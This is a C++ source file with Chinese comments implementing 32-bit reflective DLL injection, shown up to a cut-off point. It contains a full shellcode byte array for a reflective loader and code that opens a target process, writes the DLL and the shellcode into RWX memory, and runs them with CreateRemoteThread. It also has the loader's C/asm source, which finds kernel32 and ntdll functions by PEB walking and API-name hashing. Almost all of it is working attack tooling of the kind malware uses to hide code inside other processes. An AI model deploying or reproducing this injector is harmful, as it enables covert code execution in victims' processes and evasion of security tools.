// test.cpp : Defines the entry point for the console application.
//
#include "pch.h"
#include "DllInject_Reflect_Shell.h"

/**
 * 测试成功（测试环境 win11、winxp）
 * 作用：向目标进程进行反射性DLL注入（shellcode版）
 * 函数实现思路：
 *		1. 将待注入的DLL写入到目标进程中
 *		2. 将反射式DLL加载器的shellcode写入到目标进程中
 *		3. 在目标进程中创建远程线程执行shellcode（反射式DLL加载器的shellcode会将注入到目标进程中的DLL展开，并修复其导入表、重定位表，然后跳转到待注入DLL的入口点处执行）
 * 参数列表：
 * 		pid：目标进程的PID
 * 		path：待注入DLL的路径
 * 返回值：
 * 		无意义
 */
int DllInject_Reflect_Shell_x32(DWORD pid, char* path)
{
	//ReflectDllLoader_Shellcode（由reflectLoaderShellcodeX32_1函数而来）
	unsigned char buf[] = {
		0x55, 0x8B, 0xEC, 0x81, 0xEC, 0x98, 0x00, 0x00, 0x00, 0x53, 0x56, 0x57, 0x8D, 0xBD, 0x68, 0xFF, 0xFF, 0xFF, 0xB9, 0x26, 0x00, 0x00, 0x00, 0xB8, 0xCC,
		0xCC, 0xCC, 0xCC, 0xF3, 0xAB, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xF8, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x45, 0xF4, 0x00, 0x00, 0x00,
		0x00, 0xC7, 0x45, 0xF0, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x40, 0x00, 0x89, 0x45, 0xE8, 0x64, 0xA1, 0x18, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x30,
		0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x0C, 0x89, 0x45, 0xC8, 0x83, 0x7D, 0xC8, 0x00, 0x0F, 0x84, 0xDA, 0x02, 0x00, 0x00, 0x8B, 0x45, 0xC8, 0x8B, 0x48, 0x30,
		0x89, 0x4D, 0xC4, 0x8B, 0x55, 0xC8, 0x66, 0x8B, 0x42, 0x2C, 0x66, 0x89, 0x45, 0xEC, 0xC7, 0x45, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0xC0, 0xC1,
		0xC9, 0x0D, 0x89, 0x4D, 0xC0, 0x8B, 0x55, 0xC4, 0x33, 0xC0, 0x8A, 0x02, 0x83, 0xF8, 0x61, 0x7C, 0x13, 0x8B, 0x4D, 0xC4, 0x33, 0xD2, 0x8A, 0x11, 0x8B,
		0x45, 0xC0, 0x8D, 0x4C, 0x10, 0xE0, 0x89, 0x4D, 0xC0, 0xEB, 0x0F, 0x8B, 0x55, 0xC4, 0x33, 0xC0, 0x8A, 0x02, 0x8B, 0x4D, 0xC0, 0x03, 0xC8, 0x89, 0x4D,
		0xC0, 0x8B, 0x55, 0xC4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xC4, 0x66, 0x8B, 0x45, 0xEC, 0x66, 0x2D, 0x01, 0x00, 0x66, 0x89, 0x45, 0xEC, 0x8B, 0x4D, 0xEC,
		0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x85, 0xC9, 0x75, 0xA7, 0x81, 0x7D, 0xC0, 0x5B, 0xBC, 0x4A, 0x6A, 0x0F, 0x85, 0x34, 0x01, 0x00, 0x00, 0x8B, 0x55,
		0xC8, 0x8B, 0x42, 0x18, 0x89, 0x45, 0xE4, 0x8B, 0x4D, 0xE4, 0x8B, 0x55, 0xE4, 0x03, 0x51, 0x3C, 0x89, 0x55, 0xD8, 0x8B, 0x45, 0xD8, 0x83, 0xC0, 0x78,
		0x89, 0x45, 0xDC, 0x8B, 0x4D, 0xDC, 0x8B, 0x55, 0xE4, 0x03, 0x11, 0x89, 0x55, 0xD8, 0x8B, 0x45, 0xD8, 0x8B, 0x4D, 0xE4, 0x03, 0x48, 0x20, 0x89, 0x4D,
		0xDC, 0x8B, 0x55, 0xD8, 0x8B, 0x45, 0xE4, 0x03, 0x42, 0x24, 0x89, 0x45, 0xD4, 0x66, 0xC7, 0x45, 0xEC, 0x03, 0x00, 0x8B, 0x4D, 0xEC, 0x81, 0xE1, 0xFF,
		0xFF, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x8E, 0xD7, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xDC, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xB4, 0xC7, 0x45, 0xB0,
		0x00, 0x00, 0x00, 0x00, 0x8B, 0x4D, 0xB0, 0xC1, 0xC9, 0x0D, 0x89, 0x4D, 0xB0, 0x8B, 0x55, 0xB4, 0x0F, 0xBE, 0x02, 0x8B, 0x4D, 0xB0, 0x03, 0xC8, 0x89,
		0x4D, 0xB0, 0x8B, 0x55, 0xB4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xB4, 0x8B, 0x45, 0xB4, 0x0F, 0xBE, 0x08, 0x85, 0xC9, 0x75, 0xD6, 0x81, 0x7D, 0xB0, 0x8E,
		0x4E, 0x0E, 0xEC, 0x74, 0x12, 0x81, 0x7D, 0xB0, 0xAA, 0xFC, 0x0D, 0x7C, 0x74, 0x09, 0x81, 0x7D, 0xB0, 0x54, 0xCA, 0xAF, 0x91, 0x75, 0x69, 0x8B, 0x55,
		0xD8, 0x8B, 0x45, 0xE4, 0x03, 0x42, 0x1C, 0x89, 0x45, 0xE0, 0x8B, 0x4D, 0xD4, 0x33, 0xD2, 0x66, 0x8B, 0x11, 0x8B, 0x45, 0xE0, 0x8D, 0x0C, 0x90, 0x89,
		0x4D, 0xE0, 0x81, 0x7D, 0xB0, 0x8E, 0x4E, 0x0E, 0xEC, 0x75, 0x0D, 0x8B, 0x55, 0xE0, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xFC, 0xEB, 0x2A, 0x81,
		0x7D, 0xB0, 0xAA, 0xFC, 0x0D, 0x7C, 0x75, 0x0D, 0x8B, 0x4D, 0xE0, 0x8B, 0x55, 0xE4, 0x03, 0x11, 0x89, 0x55, 0xF8, 0xEB, 0x14, 0x81, 0x7D, 0xB0, 0x54,
		0xCA, 0xAF, 0x91, 0x75, 0x0B, 0x8B, 0x45, 0xE0, 0x8B, 0x4D, 0xE4, 0x03, 0x08, 0x89, 0x4D, 0xF4, 0x66, 0x8B, 0x55, 0xEC, 0x66, 0x83, 0xEA, 0x01, 0x66,
		0x89, 0x55, 0xEC, 0x8B, 0x45, 0xDC, 0x83, 0xC0, 0x04, 0x89, 0x45, 0xDC, 0x8B, 0x4D, 0xD4, 0x83, 0xC1, 0x02, 0x89, 0x4D, 0xD4, 0xE9, 0x18, 0xFF, 0xFF,
		0xFF, 0xE9, 0xFE, 0x00, 0x00, 0x00, 0x81, 0x7D, 0xC0, 0x5D, 0x68, 0xFA, 0x3C, 0x0F, 0x85, 0xF1, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xC8, 0x8B, 0x42, 0x18,
		0x89, 0x45, 0xE4, 0x8B, 0x4D, 0xE4, 0x8B, 0x55, 0xE4, 0x03, 0x51, 0x3C, 0x89, 0x55, 0xD8, 0x8B, 0x45, 0xD8, 0x83, 0xC0, 0x78, 0x89, 0x45, 0xDC, 0x8B,
		0x4D, 0xDC, 0x8B, 0x55, 0xE4, 0x03, 0x11, 0x89, 0x55, 0xD8, 0x8B, 0x45, 0xD8, 0x8B, 0x4D, 0xE4, 0x03, 0x48, 0x20, 0x89, 0x4D, 0xDC, 0x8B, 0x55, 0xD8,
		0x8B, 0x45, 0xE4, 0x03, 0x42, 0x24, 0x89, 0x45, 0xD4, 0x66, 0xC7, 0x45, 0xEC, 0x01, 0x00, 0x8B, 0x4D, 0xEC, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x85,
		0xC9, 0x0F, 0x8E, 0x99, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xDC, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xAC, 0xC7, 0x45, 0xA8, 0x00, 0x00, 0x00, 0x00,
		0x8B, 0x4D, 0xA8, 0xC1, 0xC9, 0x0D, 0x89, 0x4D, 0xA8, 0x8B, 0x55, 0xAC, 0x0F, 0xBE, 0x02, 0x8B, 0x4D, 0xA8, 0x03, 0xC8, 0x89, 0x4D, 0xA8, 0x8B, 0x55,
		0xAC, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xAC, 0x8B, 0x45, 0xAC, 0x0F, 0xBE, 0x08, 0x85, 0xC9, 0x75, 0xD6, 0x81, 0x7D, 0xA8, 0xB8, 0x0A, 0x4C, 0x53, 0x75,
		0x3D, 0x8B, 0x55, 0xD8, 0x8B, 0x45, 0xE4, 0x03, 0x42, 0x1C, 0x89, 0x45, 0xE0, 0x8B, 0x4D, 0xD4, 0x33, 0xD2, 0x66, 0x8B, 0x11, 0x8B, 0x45, 0xE0, 0x8D,
		0x0C, 0x90, 0x89, 0x4D, 0xE0, 0x81, 0x7D, 0xA8, 0xB8, 0x0A, 0x4C, 0x53, 0x75, 0x0B, 0x8B, 0x55, 0xE0, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xF0,
		0x66, 0x8B, 0x4D, 0xEC, 0x66, 0x83, 0xE9, 0x01, 0x66, 0x89, 0x4D, 0xEC, 0x8B, 0x55, 0xDC, 0x83, 0xC2, 0x04, 0x89, 0x55, 0xDC, 0x8B, 0x45, 0xD4, 0x83,
		0xC0, 0x02, 0x89, 0x45, 0xD4, 0xE9, 0x56, 0xFF, 0xFF, 0xFF, 0x83, 0x7D, 0xFC, 0x00, 0x74, 0x14, 0x83, 0x7D, 0xF8, 0x00, 0x74, 0x0E, 0x83, 0x7D, 0xF4,
		0x00, 0x74, 0x08, 0x83, 0x7D, 0xF0, 0x00, 0x74, 0x02, 0xEB, 0x0D, 0x8B, 0x4D, 0xC8, 0x8B, 0x11, 0x89, 0x55, 0xC8, 0xE9, 0x1C, 0xFD, 0xFF, 0xFF, 0x8B,
		0x45, 0xE8, 0x8B, 0x4D, 0xE8, 0x03, 0x48, 0x3C, 0x89, 0x4D, 0xCC, 0x8B, 0xF4, 0x6A, 0x40, 0x68, 0x00, 0x30, 0x00, 0x00, 0x8B, 0x55, 0xCC, 0x8B, 0x42,
		0x50, 0x50, 0x6A, 0x00, 0xFF, 0x55, 0xF4, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x89, 0x45, 0xE4, 0x8B, 0x4D, 0xCC, 0x8B, 0x51, 0x54, 0x89, 0x55,
		0xC8, 0x8B, 0x45, 0xE8, 0x89, 0x45, 0xC4, 0x8B, 0x4D, 0xE4, 0x89, 0x4D, 0xC0, 0x8B, 0x55, 0xC8, 0x8B, 0x45, 0xC8, 0x83, 0xE8, 0x01, 0x89, 0x45, 0xC8,
		0x85, 0xD2, 0x74, 0x1E, 0x8B, 0x4D, 0xC0, 0x8B, 0x55, 0xC4, 0x8A, 0x02, 0x88, 0x01, 0x8B, 0x4D, 0xC0, 0x83, 0xC1, 0x01, 0x89, 0x4D, 0xC0, 0x8B, 0x55,
		0xC4, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xC4, 0xEB, 0xD2, 0x8B, 0x45, 0xCC, 0x33, 0xC9, 0x66, 0x8B, 0x48, 0x14, 0x8B, 0x55, 0xCC, 0x8D, 0x44, 0x0A, 0x18,
		0x89, 0x45, 0xC8, 0x8B, 0x4D, 0xCC, 0x33, 0xD2, 0x66, 0x8B, 0x51, 0x06, 0x89, 0x55, 0xB8, 0x8B, 0x45, 0xB8, 0x8B, 0x4D, 0xB8, 0x83, 0xE9, 0x01, 0x89,
		0x4D, 0xB8, 0x85, 0xC0, 0x74, 0x5A, 0x8B, 0x55, 0xC8, 0x8B, 0x45, 0xE4, 0x03, 0x42, 0x0C, 0x89, 0x45, 0xC4, 0x8B, 0x4D, 0xC8, 0x8B, 0x55, 0xE8, 0x03,
		0x51, 0x14, 0x89, 0x55, 0xC0, 0x8B, 0x45, 0xC8, 0x8B, 0x48, 0x10, 0x89, 0x4D, 0xBC, 0x8B, 0x55, 0xBC, 0x8B, 0x45, 0xBC, 0x83, 0xE8, 0x01, 0x89, 0x45,
		0xBC, 0x85, 0xD2, 0x74, 0x1E, 0x8B, 0x4D, 0xC4, 0x8B, 0x55, 0xC0, 0x8A, 0x02, 0x88, 0x01, 0x8B, 0x4D, 0xC4, 0x83, 0xC1, 0x01, 0x89, 0x4D, 0xC4, 0x8B,
		0x55, 0xC0, 0x83, 0xC2, 0x01, 0x89, 0x55, 0xC0, 0xEB, 0xD2, 0x8B, 0x45, 0xC8, 0x83, 0xC0, 0x28, 0x89, 0x45, 0xC8, 0xEB, 0x96, 0x8B, 0x4D, 0xCC, 0x81,
		0xC1, 0x80, 0x00, 0x00, 0x00, 0x89, 0x4D, 0xC4, 0x8B, 0x55, 0xC4, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xC0, 0x8B, 0x4D, 0xC0, 0x83, 0x79, 0x0C,
		0x00, 0x0F, 0x84, 0xF8, 0x00, 0x00, 0x00, 0x8B, 0x55, 0xC0, 0x8B, 0x45, 0xE4, 0x03, 0x42, 0x0C, 0x8B, 0xF4, 0x50, 0xFF, 0x55, 0xFC, 0x90, 0x90, 0x90,
		0x90, 0x90, 0x90, 0x90, 0x89, 0x45, 0xE8, 0x8B, 0x4D, 0xC0, 0x8B, 0x55, 0xE4, 0x03, 0x11, 0x89, 0x55, 0xBC, 0x8B, 0x45, 0xC0, 0x8B, 0x4D, 0xE4, 0x03,
		0x48, 0x10, 0x89, 0x4D, 0xC8, 0x8B, 0x55, 0xC8, 0x83, 0x3A, 0x00, 0x0F, 0x84, 0xAE, 0x00, 0x00, 0x00, 0x83, 0x7D, 0xBC, 0x00, 0x74, 0x64, 0x8B, 0x45,
		0xBC, 0x8B, 0x08, 0x81, 0xE1, 0x00, 0x00, 0x00, 0x80, 0x85, 0xC9, 0x74, 0x55, 0x8B, 0x55, 0xE8, 0x8B, 0x45, 0xE8, 0x03, 0x42, 0x3C, 0x89, 0x45, 0xD8,
		0x8B, 0x4D, 0xD8, 0x83, 0xC1, 0x78, 0x89, 0x4D, 0xDC, 0x8B, 0x55, 0xDC, 0x8B, 0x45, 0xE8, 0x03, 0x02, 0x89, 0x45, 0xD8, 0x8B, 0x4D, 0xD8, 0x8B, 0x55,
		0xE8, 0x03, 0x51, 0x1C, 0x89, 0x55, 0xE0, 0x8B, 0x45, 0xBC, 0x8B, 0x08, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x55, 0xD8, 0x2B, 0x4A, 0x10, 0x8B,
		0x45, 0xE0, 0x8D, 0x0C, 0x88, 0x89, 0x4D, 0xE0, 0x8B, 0x55, 0xE0, 0x8B, 0x45, 0xE8, 0x03, 0x02, 0x8B, 0x4D, 0xC8, 0x89, 0x01, 0xEB, 0x27, 0x8B, 0x55,
		0xC8, 0x8B, 0x45, 0xE4, 0x03, 0x02, 0x89, 0x45, 0xC4, 0x8B, 0x4D, 0xC4, 0x83, 0xC1, 0x02, 0x8B, 0xF4, 0x51, 0x8B, 0x55, 0xE8, 0x52, 0xFF, 0x55, 0xF8,
		0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x8B, 0x4D, 0xC8, 0x89, 0x01, 0x8B, 0x55, 0xC8, 0x83, 0xC2, 0x04, 0x89, 0x55, 0xC8, 0x83, 0x7D, 0xBC, 0x00,
		0x74, 0x09, 0x8B, 0x45, 0xBC, 0x83, 0xC0, 0x04, 0x89, 0x45, 0xBC, 0xE9, 0x46, 0xFF, 0xFF, 0xFF, 0x8B, 0x4D, 0xC0, 0x83, 0xC1, 0x14, 0x89, 0x4D, 0xC0,
		0xE9, 0xFB, 0xFE, 0xFF, 0xFF, 0x8B, 0x55, 0xCC, 0x8B, 0x45, 0xE4, 0x2B, 0x42, 0x34, 0x89, 0x45, 0xE8, 0x8B, 0x4D, 0xCC, 0x81, 0xC1, 0xA0, 0x00, 0x00,
		0x00, 0x89, 0x4D, 0xC4, 0x8B, 0x55, 0xC4, 0x83, 0x7A, 0x04, 0x00, 0x0F, 0x84, 0xAD, 0x01, 0x00, 0x00, 0x8B, 0x45, 0xC4, 0x8B, 0x4D, 0xE4, 0x03, 0x08,
		0x89, 0x4D, 0xC0, 0x8B, 0x55, 0xC0, 0x83, 0x7A, 0x04, 0x00, 0x0F, 0x84, 0x95, 0x01, 0x00, 0x00, 0x8B, 0x45, 0xC0, 0x8B, 0x4D, 0xE4, 0x03, 0x08, 0x89,
		0x4D, 0xC8, 0x8B, 0x55, 0xC0, 0x8B, 0x42, 0x04, 0x83, 0xE8, 0x08, 0xD1, 0xE8, 0x89, 0x45, 0xC4, 0x8B, 0x4D, 0xC0, 0x83, 0xC1, 0x08, 0x89, 0x4D, 0xBC,
		0x8B, 0x55, 0xC4, 0x8B, 0x45, 0xC4, 0x83, 0xE8, 0x01, 0x89, 0x45, 0xC4, 0x85, 0xD2, 0x0F, 0x84, 0x4E, 0x01, 0x00, 0x00, 0x8B, 0x4D, 0xBC, 0x66, 0x8B,
		0x11, 0x66, 0xC1, 0xEA, 0x0C, 0x66, 0x83, 0xE2, 0x0F, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x83, 0xFA, 0x0A, 0x75, 0x36, 0x8B, 0x45, 0xBC, 0x66, 0x8B,
		0x08, 0x66, 0x81, 0xE1, 0xFF, 0x0F, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x55, 0xC8, 0x8B, 0x04, 0x0A, 0x03, 0x45, 0xE8, 0x8B, 0x4D, 0xBC, 0x66,
		0x8B, 0x11, 0x66, 0x81, 0xE2, 0xFF, 0x0F, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x4D, 0xC8, 0x89, 0x04, 0x11, 0xE9, 0xF1, 0x00, 0x00, 0x00, 0x8B,
		0x55, 0xBC, 0x66, 0x8B, 0x02, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x25, 0x0F, 0x00, 0x25, 0xFF, 0xFF, 0x00, 0x00, 0x83, 0xF8, 0x03, 0x75, 0x34, 0x8B, 0x4D,
		0xBC, 0x66, 0x8B, 0x11, 0x66, 0x81, 0xE2, 0xFF, 0x0F, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x45, 0xC8, 0x8B, 0x0C, 0x10, 0x03, 0x4D, 0xE8, 0x8B,
		0x55, 0xBC, 0x66, 0x8B, 0x02, 0x66, 0x25, 0xFF, 0x0F, 0x25, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x55, 0xC8, 0x89, 0x0C, 0x02, 0xE9, 0xA5, 0x00, 0x00, 0x00,
		0x8B, 0x45, 0xBC, 0x66, 0x8B, 0x08, 0x66, 0xC1, 0xE9, 0x0C, 0x66, 0x83, 0xE1, 0x0F, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x83, 0xF9, 0x01, 0x75, 0x39,
		0x8B, 0x55, 0xBC, 0x66, 0x8B, 0x02, 0x66, 0x25, 0xFF, 0x0F, 0x25, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x4D, 0xE8, 0xC1, 0xE9, 0x10, 0x8B, 0x55, 0xC8, 0x66,
		0x8B, 0x04, 0x02, 0x66, 0x03, 0xC1, 0x8B, 0x4D, 0xBC, 0x66, 0x8B, 0x11, 0x66, 0x81, 0xE2, 0xFF, 0x0F, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x4D,
		0xC8, 0x66, 0x89, 0x04, 0x11, 0xEB, 0x53, 0x8B, 0x55, 0xBC, 0x66, 0x8B, 0x02, 0x66, 0xC1, 0xE8, 0x0C, 0x66, 0x25, 0x0F, 0x00, 0x25, 0xFF, 0xFF, 0x00,
		0x00, 0x83, 0xF8, 0x02, 0x75, 0x3B, 0x8B, 0x4D, 0xBC, 0x66, 0x8B, 0x11, 0x66, 0x81, 0xE2, 0xFF, 0x0F, 0x81, 0xE2, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x45,
		0xE8, 0x25, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x4D, 0xC8, 0x66, 0x8B, 0x14, 0x11, 0x66, 0x03, 0xD0, 0x8B, 0x45, 0xBC, 0x66, 0x8B, 0x08, 0x66, 0x81, 0xE1,
		0xFF, 0x0F, 0x81, 0xE1, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x45, 0xC8, 0x66, 0x89, 0x14, 0x08, 0x8B, 0x4D, 0xBC, 0x83, 0xC1, 0x02, 0x89, 0x4D, 0xBC, 0xE9,
		0x9E, 0xFE, 0xFF, 0xFF, 0x8B, 0x55, 0xC0, 0x8B, 0x45, 0xC0, 0x03, 0x42, 0x04, 0x89, 0x45, 0xC0, 0xE9, 0x5E, 0xFE, 0xFF, 0xFF, 0x8B, 0x4D, 0xCC, 0x8B,
		0x55, 0xE4, 0x03, 0x51, 0x28, 0x89, 0x55, 0xC8, 0x8B, 0xF4, 0x6A, 0x00, 0x6A, 0x00, 0x6A, 0xFF, 0xFF, 0x55, 0xF0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
		0x90, 0x8B, 0xF4, 0x6A, 0x00, 0x6A, 0x01, 0x8B, 0x45, 0xE4, 0x50, 0xFF, 0x55, 0xC8, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x33, 0xC0, 0x5F, 0x5E,
		0x5B, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x8B, 0xE5, 0x5D, 0xC3
	};
	HANDLE hRemoteProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hRemoteProcess == NULL) {
		printf("远程进程打开失败!\n");
	}
	// 将待注入DLL写入到目标进程空间中
	FILEINFOR file = readFile(path);
	LPVOID pVirtualAddrDll = VirtualAllocEx(hRemoteProcess, NULL, file.size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pVirtualAddrDll == NULL) {
		printf("目标进程内存空间申请失败!\n");
	}
	if (WriteProcessMemory(hRemoteProcess, pVirtualAddrDll, file.p, file.size, NULL) == 0) {
		printf("目标进程内存空间写入失败!\n");
	}

	char* tmp = (char*)(&pVirtualAddrDll);  // 修改shellcode中FileBuffer的基址（以便shellcode可以在目标进程中正确找到待展开DLL）
	buf[59] = tmp[0];
	buf[60] = tmp[1];
	buf[61] = tmp[2];
	buf[62] = tmp[3];

	// 将反射式DLL加载器的shellcode写入到目标进程空间中
	LPVOID pVirtualAddrShell = VirtualAllocEx(hRemoteProcess, NULL, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pVirtualAddrShell == NULL) {
		printf("目标进程内存空间申请失败!\n");
	}
	if (WriteProcessMemory(hRemoteProcess, pVirtualAddrShell, buf, sizeof(buf), NULL) == 0) {
		printf("目标进程内存空间写入失败!\n");
	}
	//创建远程线程执行shellcode
	DWORD dwThreadId = 0;
	HANDLE hThread = CreateRemoteThread(hRemoteProcess, NULL, 1024 * 1024, (LPTHREAD_START_ROUTINE)pVirtualAddrShell, NULL, (DWORD)NULL, &dwThreadId);
	return 1;
}

/**
 * 将二进制文件读取到内存中
 * 参数列表  
 *		filePath 将要读取的文件的路径
 * 返回值
 *		文件在内存中的位置信息与文件大小信息
 */
FILEINFOR readFile(char* filePath) {
	FILEINFOR Infor;
	FILE* file = fopen(filePath, "rb"); //以二进制只读的形式打开文件
	if (file == NULL)  //若文件打开失败，就返回“空”信息
	{
		printf("open error\n");
		Infor.p = NULL;
		Infor.size = 0;
		return Infor;
	}
	fseek(file, 0, SEEK_END);  //将文件指针指向文件末尾
	Infor.size = ftell(file);  //利用ftell函数获取文件大小（单位：字节）
	Infor.p = (char*)malloc(Infor.size);  //根据文件大小申请对应大小的内存空间
	if (!Infor.p)
	{
		printf("分配空间失败!");
		fclose(file);
		Infor.p = NULL;
		Infor.size = 0;
		return Infor;
	}
	fseek(file, 0, SEEK_SET);  //将文件指针重新指向文件头
	size_t n = 0;
	n = fread(Infor.p, 1024, Infor.size / 1024, file);  //开始以1024B大小为单位读取文件
	if (Infor.size % 1024 != 0)  //由于文件大小不总是会被1024B整除，所以余出来的部分需要我们单独的1字节1字节的读取
	{
		n = n + fread(Infor.p + ftell(file), 1, Infor.size - ftell(file), file);
	}
	if (!n)
	{
		printf("读取数据失败!");
		fclose(file);
		Infor.p = NULL;
		Infor.size = 0;
		return Infor;
	}
	fclose(file);  //关闭文件
	return Infor;
}


/**
 * DllInject_Reflect_Shell_x32函数中所使用的shellcode由该函数生成
 */
int reflectLoaderShellcodeX32_1()
{

	LOADLIBRARYA pLoadLibraryA = NULL;
	GETPROCADDRESS pGetProcAddress = NULL;
	VIRTUALALLOC pVirtualAlloc = NULL;
	NTFLUSHINSTRUCTIONCACHE pNtFlushInstructionCache = NULL;

	USHORT usCounter;
	// the initial location of this image in memory(旧展开前镜像的地址)
	ULONG_PTR uiLibraryAddress;
	// the kernels base address and later this images newly loaded base address(新展开后镜像的地址)
	ULONG_PTR uiBaseAddress;

	ULONG_PTR uiAddressArray;
	ULONG_PTR uiNameArray;
	ULONG_PTR uiExportDir;
	ULONG_PTR uiNameOrdinals;
	DWORD dwHashValue;

	// variables for loading this image
	ULONG_PTR uiHeaderValue;
	ULONG_PTR uiValueA;
	ULONG_PTR uiValueB;
	ULONG_PTR uiValueC;
	ULONG_PTR uiValueD;
	ULONG_PTR uiValueE;

	__asm
	{
		mov eax, 0x00400000;  //目标进程中待展开DLL的基址
		mov uiLibraryAddress, eax;
	}
	_asm {
		mov eax, fs: [0x18];//找到teb
		mov eax, [eax + 0x30];//peb
		mov eax, [eax + 0x0c];//PEB_LDR_DATA
		mov eax, [eax + 0x0c];//LIST_ENTRY 主模块
		mov uiValueA, eax;
	}
	while (uiValueA)
	{
		// get pointer to current modules name (unicode string)
		uiValueB = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.pBuffer;
		// set bCounter to the length for the loop
		usCounter = ((PLDR_DATA_TABLE_ENTRY)uiValueA)->BaseDllName.Length;
		// clear uiValueC which will store the hash of the module name
		uiValueC = 0;

		// compute the hash of the module name...
		do
		{
			uiValueC = ROR((DWORD)uiValueC);
			// normalize to uppercase if the madule name is in lowercase
			if (*((BYTE *)uiValueB) >= 'a')
				uiValueC += *((BYTE *)uiValueB) - 0x20;
			else
				uiValueC += *((BYTE *)uiValueB);
			uiValueB++;
		} while (--usCounter);

		// compare the hash with that of kernel32.dll
		if ((DWORD)uiValueC == KERNEL32DLL_HASH)
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the VA of the export directory
			uiExportDir = (uiBaseAddress + ((PIMAGE_DATA_DIRECTORY)uiNameArray)->VirtualAddress);

			// get the VA for the array of name pointers
			uiNameArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNames);

			// get the VA for the array of name ordinals
			uiNameOrdinals = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfNameOrdinals);

			usCounter = 3;

			// loop while we still have imports to find
			while (usCounter > 0)
			{
				// compute the hash values for this function name
				char* p1 = (char *)(uiBaseAddress + DEREF_32(uiNameArray));
				//dwHashValue = hash( (char *)( uiBaseAddress + DEREF_32( uiNameArray ) )  );
				DWORD dwHashValue = 0;
				do
				{
					dwHashValue = ROR(dwHashValue);
					dwHashValue += *p1;
				} while (*++p1);

				// if we have found a function we want we get its virtual address
				if (dwHashValue == LOADLIBRARYA_HASH || dwHashValue == GETPROCADDRESS_HASH || dwHashValue == VIRTUALALLOC_HASH)
				{
					// get the VA for the array of addresses
					uiAddressArray = (uiBaseAddress + ((PIMAGE_EXPORT_DIRECTORY)uiExportDir)->AddressOfFunctions);

					// use this functions name ordinal as an index into the array of name pointers
					uiAddressArray += (DEREF_16(uiNameOrdinals) * sizeof(DWORD));

					// store this functions VA
					if (dwHashValue == LOADLIBRARYA_HASH)
						pLoadLibraryA = (LOADLIBRARYA)(uiBaseAddress + DEREF_32(uiAddressArray));
					else if (dwHashValue == GETPROCADDRESS_HASH)
						pGetProcAddress = (GETPROCADDRESS)(uiBaseAddress + DEREF_32(uiAddressArray));
					else if (dwHashValue == VIRTUALALLOC_HASH)
						pVirtualAlloc = (VIRTUALALLOC)(uiBaseAddress + DEREF_32(uiAddressArray));

					// decrement our counter
					usCounter--;
				}

				// get the next exported function name
				uiNameArray += sizeof(DWORD);

				// get the next exported function name ordinal
				uiNameOrdinals += sizeof(WORD);
			}
		}
		else if ((DWORD)uiValueC == NTDLLDLL_HASH)
		{
			// get this modules base address
			uiBaseAddress = (ULONG_PTR)((PLDR_DATA_TABLE_ENTRY)uiValueA)->DllBase;

			// get the VA of the modules NT Header
			uiExportDir = uiBaseAddress + ((PIMAGE_DOS_HEADER)uiBaseAddress)->e_lfanew;

			// uiNameArray = the address of the modules export directory entry
			uiNameArray = (ULONG_PTR)&((PIMAGE_NT_HEADERS)uiExportDir)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];

			// get the VA of the export directory
